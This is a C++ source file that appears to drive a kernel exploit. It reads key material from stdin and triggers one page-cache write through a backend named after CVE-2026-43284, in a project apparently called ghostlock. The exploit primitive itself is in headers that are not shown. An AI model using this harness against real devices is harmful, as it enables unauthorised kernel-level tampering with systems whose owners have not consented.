#include <array>
#include <cerrno>
#include <cstdio>
#include <cstddef>
#include <cstdint>
#include <span>

/** @file pipeline/probe_43284.cpp
 *  A temporary driver for one page cache write through the real access. TEMPORARY FILE.
 *
 *  Why it exists: the composition that would normally drive a write does not exist yet, and the
 *  goal requires the write be exercised on a device through any temporary means. This is that
 *  means, and it is registered for removal in device-probe-43284-plan.md, which also names the
 *  condition: once the device evidence is archived, this file and its test are deleted and a grep
 *  for probe in the tree must return nothing.
 *
 *  Why it needs no new flag: the entry already reads a framed document from stdin. The probe simply
 *  continues where that document ends and reads the optional session frame, which is the only channel
 *  the key material ever travels on. No frame, no run -- that is the Missing status the frame reader
 *  already names, and with it the probe adds nothing at all to a run that does not select this
 *  backend. It prints named diagnostics and never prints key material.
 */
#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/session_frame.hpp"
#include "contract/kernel_access.hpp"
#include "contract/kind.hpp"

namespace ghostlock::pipeline {
    namespace {
        using backend::cve_2026_43284::AccessParams;
        using backend::cve_2026_43284::read_session_secret_frame;
        using backend::cve_2026_43284::SaMaterial;
        using backend::cve_2026_43284::SessionFrameStatus;
        using contract::AccessChannel;
        using contract::BackendId;
        using contract::KernelAccess;

        /** Read up to @p size bytes from a descriptor, the way the frame reader does. Mixing stdio
         *  with raw reads on one stream loses bytes: the buffered read takes what the raw one needs. */
        std::size_t read_upto_raw(int fd, std::uint8_t *out, std::size_t size) noexcept {
            std::size_t used = 0U;
            while (used < size) {
                const ssize_t got = ::read(fd, out + used, size - used);
                if (got > 0) {
                    used += static_cast<std::size_t>(got);
                    continue;
                }
                if (got == 0) {
                    break;
                }
                if (errno == EINTR) {
                    continue;
                }
                break;
            }
            return used;
        }

        /** Read the framed document that precedes the frame, or zero when the stream holds none. */
        std::size_t read_document(std::uint8_t *buf, std::size_t capacity) noexcept {
            std::uint8_t header[4U] = {};
            if (read_upto_raw(0, header, sizeof(header)) != sizeof(header)) {
                return 0U;
            }
            const std::size_t length = (static_cast<std::size_t>(header[0U]) << 24U) |
                                       (static_cast<std::size_t>(header[1U]) << 16U) |
                                       (static_cast<std::size_t>(header[2U]) << 8U) |
                                       static_cast<std::size_t>(header[3U]);
            if (length == 0U || length > capacity) {
                return 0U;
            }
            if (read_upto_raw(0, buf, length) != length) {
                return 0U;
            }
            return length;
        }
    }  // namespace

    /**
     *  One write, if and only if a session frame is present on stdin.
     *
     *  @param document_bytes A buffer the document is read into; the probe does not interpret it.
     *  @param capacity       Its capacity.
     *  @return An exit code: 0 when the write happened, 3 when no frame was present (not this
     *          backend run), and 4, 5 or 6 for the named failure steps.
     *  @note  Order matters: the frame is read after the document, which is how the app frames the
     *         stream. Reading it first would consume document bytes.
     */
    int probe_43284_write_once(std::uint8_t *document_bytes, std::size_t capacity) noexcept {
        if (read_document(document_bytes, capacity) == 0U) {
            std::printf("probe-43284: no framed document on stdin\n");
            return 4;
        }
        SaMaterial sa{};
        const SessionFrameStatus frame = read_session_secret_frame(0, &sa);
        if (frame == SessionFrameStatus::Missing) {
            std::printf("probe-43284: no session frame, so this is not a 43284 run\n");
            return 3;
        }
        if (frame != SessionFrameStatus::Ok) {
            std::printf("probe-43284: the session frame was refused as %u\n",
                        static_cast<unsigned>(frame));
            return 5;
        }
        AccessParams params;
        params.sa = sa;
        params.offset = 0U;
        params.offset_set = false;
        const std::unique_ptr<KernelAccess> access = KernelAccess::create(BackendId::Cve_2026_43284);
        if (access == nullptr) {
            std::printf("probe-43284: this build has no page cache backend\n");
            return 6;
        }
        const KernelAccess::AccessResult<bool> up = access->initialize(params);
        if (!up.ok()) {
            std::printf("probe-43284: initialize refused with status %u\n",
                        static_cast<unsigned>(up.status));
            return 6;
        }
        std::array<std::byte, 16U> block{};
        const KernelAccess::AccessResult<std::size_t> wrote =
            access->write(0U, std::span<const std::byte>(block.data(), block.size()),
                          AccessChannel::PageCache, params);
        const bool down = access->shutdown().ok();
        std::printf("probe-43284: write status %u, value %zu, shutdown %s\n",
                    static_cast<unsigned>(wrote.status), wrote.value, down ? "ok" : "refused");
        return wrote.ok() ? 0 : 6;
    }
}  // namespace ghostlock::pipeline
